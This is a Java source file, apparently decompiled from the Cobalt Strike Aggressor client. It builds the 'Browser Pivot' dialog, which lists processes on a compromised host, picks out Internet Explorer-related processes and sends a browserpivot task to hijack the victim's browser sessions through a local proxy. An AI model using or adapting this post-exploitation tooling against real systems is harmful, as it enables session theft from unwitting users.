package aggressor.dialogs;

import aggressor.AggressorClient;
import beacon.TaskBeacon;
import common.AObject;
import common.Callback;
import common.CommonUtils;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.io.IOException;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;

import ui.ATable;
import ui.GenericTableModel;

public class BrowserPivotSetup extends AObject implements Callback, DialogListener {

    protected String bid = "";

    protected AggressorClient client = null;

    protected JFrame dialog = null;

    protected GenericTableModel model = null;

    protected ATable table = null;

    protected String[] cols = {"PID", "PPID", "Arch", "Name", "User", " "};

    public BrowserPivotSetup(AggressorClient aggressorClient, String string) {
        this.client = aggressorClient;
        this.bid = string;
        this.model = DialogUtils.setupModel("PID", this.cols, new LinkedList());
    }

    public void refresh() {
        this.client.getConnection().call("beacons.task_ps", CommonUtils.args(this.bid), this);
    }

    public void dialogAction(ActionEvent actionEvent, Map map) {
        int i = Integer.parseInt(model.getSelectedValueFromColumn(table, "PID") + "");
        String str = model.getSelectedValueFromColumn(table, "Arch") + "";
        int j = DialogUtils.number(map, "ProxyPort");
        TaskBeacon taskBeacon = new TaskBeacon(client, client.getData(),
                client.getConnection(), new String[]{bid});
        DialogUtils.openOrActivate(client, bid);
        taskBeacon.input("browserpivot " + i + " " + str);
        taskBeacon.BrowserPivot(bid, i, str, j);
    }

    public void show() throws IOException {
        this.dialog = DialogUtils.dialog("Browser Pivot", 680, 240);
        this.dialog.setLayout(new BorderLayout());
        table = DialogUtils.setupTable(model, cols, true);
        Map map = DialogUtils.toMap("PID: 60, PPID: 60, Arch: 60, Name: 120, User: 240");
        map.put(" ", "20");
        DialogUtils.setTableColumnWidths(this.table, map);
        JScrollPane jScrollPane = new JScrollPane(this.table);
        jScrollPane.setPreferredSize(new Dimension(jScrollPane.getWidth(), 100));
        DialogManager dialogManager = new DialogManager(this.dialog);
        dialogManager.addDialogListener(this);
        dialogManager.set("ProxyPort", CommonUtils.randomPort() + "");
        dialogManager.text("ProxyPort", "Proxy Server Port:");
        JButton jButton1 = dialogManager.action("Launch");
        JButton jButton2 = dialogManager.help("https://www.cobaltstrike.com/help-browser-pivoting");
        JPanel jPanel = new JPanel();
        jPanel.setLayout(new BorderLayout());
        jPanel.add(dialogManager.row(), "North");
        jPanel.add(DialogUtils.center(jButton1, jButton2), "South");
        this.dialog.add(jScrollPane, "Center");
        this.dialog.add(jPanel, "South");
        refresh();
        this.dialog.setVisible(true);
    }

    public void result(String string, Object object) {
        LinkedList<Map> linkedList = new LinkedList();
        HashMap hashMap = new HashMap();
        String[] arrstring = object.toString().trim().split("\n");
        for (int i = 0; i < arrstring.length; i++) {
            String[] strs = arrstring[i].split("\t");
            HashMap hashMap1 = new HashMap();
            if (strs.length >= 1)
                hashMap1.put("Name", strs[0]);
            if (strs.length >= 2)
                hashMap1.put("PPID", strs[1]);
            if (strs.length >= 3)
                hashMap1.put("PID", strs[2]);
            if (strs.length >= 4)
                hashMap1.put("Arch", strs[3]);
            if (strs.length >= 5)
                hashMap1.put("User", strs[4]);
            if (strs.length >= 6)
                hashMap1.put("Session", strs[5]);
            if (strs.length >= 3)
                hashMap.put(strs[2], strs[0].toLowerCase());
            String str = (hashMap1.get("Name") + "").toLowerCase();
            if (str.equals("explorer.exe") || str.equals("iexplore.exe"))
                linkedList.add(hashMap1);
        }
        for (Map map : linkedList) {
            String str1 = map.get("PPID") + "";
            String str2 = hashMap.get(str1) + "";
            if ("iexplore.exe".equals(str2)) {
                map.put(" ", '\u2713');//✓
            }
        }
        DialogUtils.setTable(this.table, this.model, linkedList);
    }
}
